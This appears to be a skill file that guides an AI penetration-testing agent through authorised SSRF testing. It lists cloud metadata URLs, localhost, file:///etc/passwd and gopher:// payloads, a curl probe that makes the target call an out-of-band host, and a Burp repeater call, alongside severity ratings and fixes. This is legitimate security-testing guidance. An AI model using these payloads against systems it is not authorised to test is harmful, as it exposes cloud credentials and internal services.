---
name: testing-ssrf
description: Test for OWASP A10 SSRF — cloud metadata, internal services, file:// and gopher:// protocol abuse.
---

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-api-enum`, `mcp-burp`.

Use this skill when the target fetches URLs server-side — webhooks, image proxies, URL previewers, import-from-URL features. Any feature where the server makes an outbound HTTP or other protocol request based on user-supplied input is a candidate for SSRF testing.

## Signal to look for

- `url=` parameters where the server fetches the supplied value
- `src=` parameters used to load remote resources
- `image=` parameters that retrieve and render or store remote images
- `callback=` parameters that instruct the server to POST results to a supplied endpoint

## Test steps

1. Baseline probe to attacker-controlled host (Burp Collaborator Pro, interactsh, or a VPS with logged access) to confirm the server makes outbound requests.
2. Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal` (GCP), `http://169.254.169.254/metadata/instance` (Azure).
3. Internal services: `http://localhost:<port>`, `http://127.0.0.1:22`.
4. Protocol abuse: `file:///etc/passwd`, `gopher://<target>:<port>/...`.
5. Capture evidence per `methodology-evidence-capture`.

## Tool commands

**Shell:**

```bash
curl "https://target.example.com/fetch?url=http://<interactsh-id>.oast.pro"
# Success: interactsh logs inbound HTTP from target's IP
```

**MCP:**

```python
burp_repeater_send(raw_base64=<b64 with SSRF payload>, host="target.example.com", port=443, secure=true, tab_name="ssrf-probe")
```

Check the response body for metadata content or confirm OOB callback in the interactsh/Collaborator log. A successful MCP call returns a `{"ok": true, ...}` envelope; the SSRF result is in the body or confirmed externally.

## Interpret results

- OOB callback confirms network egress from the server to an external host; this is sufficient to establish SSRF.
- Metadata response content (e.g., IAM role names, tokens, instance IDs) confirms a cloud-metadata read.
- File contents in the response confirm `file://` scheme processing by the server.
- False positives: a DNS-only callback (no HTTP body received) may indicate DNS exfiltration only, not full HTTP SSRF — note the distinction in the finding and test further.

## Finding writeup

- **Title:** `SSRF in <parameter>`
- **Severity:**
  - Cloud metadata read = Critical
  - Internal service access = High
  - DNS callback only = Medium
- **Evidence** per `methodology-evidence-capture`: include the payload request, the OOB log entry or the raw response containing metadata or file contents.
- **Fix:** allow-list outbound targets; disable unused URL schemes; pin resolutions or block RFC1918 + 169.254.0.0/16 at egress.

## References

- OWASP WSTG SSRF: `https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery`
- PortSwigger SSRF: `https://portswigger.net/web-security/ssrf`
- CWE-918: `https://cwe.mitre.org/data/definitions/918.html`

## Scope

This skill operates within the engagement scope established by
`methodology-scoping` and `methodology-rules-of-engagement`. Targets are
constrained mechanically via `burp_scope_check`; hosts outside Burp scope are
not tested.
